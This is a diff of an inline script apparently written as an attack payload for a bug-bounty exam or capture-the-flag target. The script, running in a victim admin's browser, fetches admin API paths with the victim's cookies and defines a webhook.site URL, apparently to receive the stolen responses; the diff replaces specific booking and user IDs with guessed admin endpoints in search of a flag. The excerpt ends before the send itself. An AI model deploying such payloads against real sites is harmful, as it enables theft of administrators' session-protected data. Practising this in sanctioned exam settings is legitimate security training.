@@ -4,17 +4,16 @@
     <script>
         const webh = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
         const base = "https://api-bugbounty-exam.hashacademy.co";
-        
-        // This is the ID of the "BugHunter / FlagSeeker" rental we found
-        const flagBookingId = "69dfe3e2bee6d6b7c661c922";
 
-        const finalTargets = [
-            `/api/admin/bookings/${flagBookingId}`,
-            `/api/admin/rentals/${flagBookingId}`,
-            `/api/admin/users/69da4749adf0dbb976ce8e37` // The user associated with that flag booking
+        const finalAttempts = [
+            "/api/auth/profile",            // Fetching the Admin's own profile
+            "/api/admin/users/me",          // Common admin alias
+            "/api/admin/settings",          // System-wide settings
+            "/api/admin/licenses",          // Where "verifiedLicenses" (from stats) live
+            "/api/v1/admin/verification"    // Specialized flag endpoint
         ];
 
-        finalTargets.forEach(path => {
+        finalAttempts.forEach(path => {
             fetch(base + path, { credentials: "include" })
                 .then(r => r.text())
                 .then(data => {
